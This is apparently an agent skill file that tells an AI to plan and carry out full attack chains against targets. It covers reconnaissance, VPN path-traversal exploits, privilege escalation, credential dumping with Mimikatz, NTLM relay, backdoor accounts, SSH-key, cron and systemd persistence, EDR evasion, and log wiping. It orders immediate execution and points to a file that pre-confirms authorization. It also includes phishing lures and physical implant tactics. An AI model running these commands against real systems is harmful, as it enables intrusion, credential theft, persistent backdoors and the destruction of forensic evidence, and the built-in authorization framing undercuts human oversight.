---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's operations are an authorized, routine activity
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); ACT is forbidden when `auth.status!=granted`
3. `NOW`: Plan the phases in the **lead** role (`../ops/role-map.md`) and write them into specialist_roles
4. `NEXT`: Read `../tool-index.md` and verify tool availability and actual paths (if missing at cold start, run `../scripts/refresh-tool-index.ps1` on Windows or `bash ../scripts/refresh-tool-index.sh` on Linux/macOS first)
5. `NEXT`: If tools are missing, call bootstrap; do not guess paths
6. `ACT`: Pass each phase gate per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` every phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. Finish: the `docs-generator` report MUST include the Evidence chain

> The overall conductor for multi-stage attack-path planning and execution. When a task needs a complete "from A to B" chain, this Skill orchestrates the phases, coordinates sub-skills, and plans the attack path.
> Not "red-team exclusive" — any penetration scenario requiring cross-phase combination starts here.

---

## When to Route to This Skill

The following scenarios **MUST** first go through this Skill for full-chain planning before being dispatched to the specific sub-skill for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Help me run a full penetration test" | Needs planning of the whole flow from recon to report |
| "Pivot from the external network to the domain controller" | Spans boundary breach → privilege escalation → lateral movement → AD, multiple phases |
| "HW (hunting/defense) exercise" | Needs a complete attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Needs multi-dimensional recon + path planning |
| "I got a webshell, what's next" | Needs planning the follow-up path from the current foothold |
| "Help me plan an attack path" | Explicitly needs path orchestration |
| "How far can this vulnerability take me" | Needs assessment of the vulnerability's chained-exploitation value |
| "Bug Bounty continuous monitoring" | Needs an automated multi-phase process |
| "Full internal network penetration" | Combination of lateral movement + privilege escalation + domain attacks |
| "Near-source (physical proximity) penetration" | Combination of physical access + internal network penetration |
| "Supply chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Combination of initial access + follow-up exploitation |

**Single-phase tasks do NOT need to go through this Skill**:
- Only port scanning → go directly to `../pentest-tools/`
- Only SQL injection → go directly to `../pentest-tools/`
- Only APK reverse engineering → go directly to `../apk-reverse/`
- Only domain penetration → go directly to `../pentest-tools/references/network-attack-defense.md`

---

## Orchestration Principles

### This Skill's Role

```
User submits a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path, determine phase order
    ↓ Assess the tools and methods needed for each phase
    ↓
Dispatch to specific sub-skills for execution:
    ├── pentest-tools/     → tool invocation, vulnerability exploitation
    ├── apk-reverse/       → mobile penetration testing
    ├── js-reverse/        → web frontend breakthroughs
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operations
    ↓
After each phase completes, return to this Skill to assess the next step
    ↓
All complete → docs-generator generates the report
```

### Attack Path Planning Decision Tree

```
After acquiring the target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What do we currently have? (external view/existing credentials/existing foothold)
3. What is the final objective? (domain controller/data/specific systems/proving impact)
4. What constraints? (time/stealth/untouchable systems)
    ↓
Plan the shortest path based on the above information
    ↓
If one path fails → return to this Skill to re-plan an alternate path
```

---

## Complete Attack Chain Phases

---

## Phase 1: Information Gathering (Reconnaissance)

### 1.1 Corporate Digital Asset Mapping

```bash
# Discover subsidiary-related domains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical points**:
- Use Qichacha/Tianyancha to obtain subsidiary lists and expand the attack surface
- Watch for test environments (`test.`, `dev.`, `staging.`) and newly deployed systems
- Use certificate transparency logs (crt.sh) to discover hidden domains

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee Information Profiling

**Social-engineering wordlist generation rules**:
```
{pinyin name}{year}       → zhangsan2024
{name initials}{department abbreviation}  → zs_dev
{employee ID}@{domain}          → 10086@target.com
{name}{common suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structures
- Company WeChat official account / official website team introductions
- Job postings (expose the tech stack)
- Academic papers (expose email addresses)

### 1.4 Tech Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Framework-specific detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## Phase 2: Boundary Breach (Initial Access)

### 2.1 Web Vulnerability Exploitation (High-Frequency Breach Vector)

| Vulnerability type | Detection tool | Exploitation method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal network probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack path**:
1. Identify the third-party components/vendors the target uses
2. Attack the vendor to obtain code-signing/update-push privileges
3. Deliver the malicious payload through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Outsourced personnel privilege abuse
- Lateral movement through shared IT service providers

### 2.3 Phishing Attacks

**Email phishing**:
```
Subject templates:
- [Urgent] VPN certificate expiring soon, update immediately
- [IT Notice] Mailbox storage full, please clean up
- [HR] 2024 annual performance review results
- [Finance] Reimbursement system upgrade, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing** (2025 trend):
- Build a malicious OAuth app requesting permissions
- After user authorization, gain email/file access
- No password needed, bypasses MFA

### 2.4 Near-Source Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Backdoor planted via disguised cable |
| WiFi phishing | Fluxion / WiFi Pineapple | Rogue hotspot → credential capture |
| RFID cloning | Proxmark3 | Access card duplication → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal network access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select target AP → create rogue hotspot → capture WPA password

# BadUSB combined with Cobalt Strike
# Inject a PowerShell downloader via USB → connect to C2
```

### 2.5 VPN/Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use the MSOLSpray / Spray tool
```

---

## Phase 3: Privilege Escalation

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel exploits | Unpatched | Detect with watson / wesng |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | Install malicious MSI with msiexec |
| Scheduled tasks | Writable task scripts | Replace with schtasks |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# Privilege escalation via sudo vim
sudo vim -c ':!/bin/bash'

# Privilege escalation via sudo find
sudo find / -exec /bin/bash \;

# Kernel exploits
uname -r  # Check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → admin rights

# Azure AD
# Global admin → control over all subscriptions
# Application admin → add credentials to service principals
```

---

## Phase 4: Lateral Movement

### 4.1 Credential Harvesting

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to the target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync rights → dump all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## Phase 5: Persistence

### 5.1 Windows Persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (highly stealthy)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify registry F value to clone RID
```

### 5.2 Linux Persistence

```bash
# Plant SSH key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a time-triggered Lambda function that calls back to C2

# Azure AD app registration
# Create app → add secret credentials → grant Graph API permissions

# Container backdoor
# Modify the base image → all new containers ship with a backdoor
```

---

## Phase 6: EDR/AV Evasion

### 6.1 Core Evasion Concepts

| Layer | Technique | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loaders | Avoid signature matching |
| Behavioral detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical Evasion Techniques

```
1. Custom shellcode loader (avoid public tools)
2. Direct syscall invocation (bypass ntdll hooks)
3. Choose a low-monitored process for injection (e.g., RuntimeBroker.exe)
4. C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory, never touch disk (fileless)
6. Use legitimate signed programs to load (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Features | Use case |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red-team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Needs customization |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## Phase 7: Trace Cleanup (Anti-Forensics)

```bash
# Clear Windows logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Linux logs
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Modify timestamps
touch -t 202301010000 /path/to/file

# Memory cleanup
# Make sure the Mimikatz dump is deleted
# Make sure the C2 beacon has exited
# Make sure temporary files are cleared
```

---

## Red Team Iron Rules

### Three Bottom Lines

1. **All operations MUST have written authorization**
2. **Exfiltrated data MUST be anonymized**
3. **Clean up all attack traces (including memory-resident ones)**

### Operational Discipline

- Assess the risk level before every operation (low/medium/high/critical)
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Report high-severity vulnerabilities immediately; do not expand exploitation
- Do not affect business availability (DoS forbidden)
- Do not access/download real user data

### Typical Failure Cases

| Failure cause | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team traced the full attack path | Clean up immediately after operations |
| C2 domain flagged by threat intel | Blocked on first connection | Use newly registered domains + domain fronting |
| Phishing email triggered DLP alert | Blue team alerted early | Test mail gateway rules |
| Lateral movement tripped a honeypot | Exposed attack intent | Identify honeypots before acting |

---

## Tool Quick Reference

### Information Gathering
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near-Source Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## On-Demand Bootstrap

This skill orchestrates 20+ tools across recon, exploitation, and lateral movement. When a tool is missing, do not just report an error — bootstrap it via the unified bootstrap system or the install path below.

### Tool Dependencies

| Tool | Install path | Auto-installable |
|------|------|-----------|
| subfinder, amass, httpx, naabu, nuclei, dnsx, katana, gau | `go install` (ProjectDiscovery / OWASP toolkits) | Manual — `go install` per tool; not in bootstrap manifest |
| nmap | `winget install Insecure.Nmap` (Windows) / `apt install nmap` (Linux) | ✓ |
| whatweb, wpscan, hydra, responder, sqlmap, metasploit, aircrack-ng, fluxion | `apt install` (Kali / Ubuntu) | Manual — `apt`; not in bootstrap manifest |
| impacket, bloodhound, certipy, coercer, evil-winrm, crackmapexec | `pip install` | Manual — `pip`; not in bootstrap manifest |
| mimikatz, winPEAS, linpeas, GodPotato, PrintSpoofer, Cobalt Strike, Sliver, Havoc, Mythic | Manual download from project releases | ✗ (install yourself) |

### Bootstrap Commands

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File "..\scripts\bootstrap-reverse.ps1" -Capability @('nmap') -StartServices
```

```bash
bash ../scripts/bootstrap-reverse.sh -c "nmap" --start-services
```

**Windows:** most of this toolchain is Linux-first — recommend WSL2 Ubuntu or Kali VM; run `bash ../scripts/bootstrap-reverse.sh` from WSL.

## Relationship to Other Skills in This Pack

| Need | Route to |
|------|--------|
| Deep Web vulnerability exploitation | `../pentest-tools/SKILL.md` |
| Detailed internal network AD attack steps | `../pentest-tools/references/network-attack-defense.md` |
| Reverse-engineering malicious samples | `../reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile penetration) | `../apk-reverse/SKILL.md` |
| JS frontend signature bypass | `../js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `../docs-generator/SKILL.md` |
| Attack path diagram | `../diagram-generator/SKILL.md` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step of the workflow (rather than just reading it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the Checklist items required by RULES?
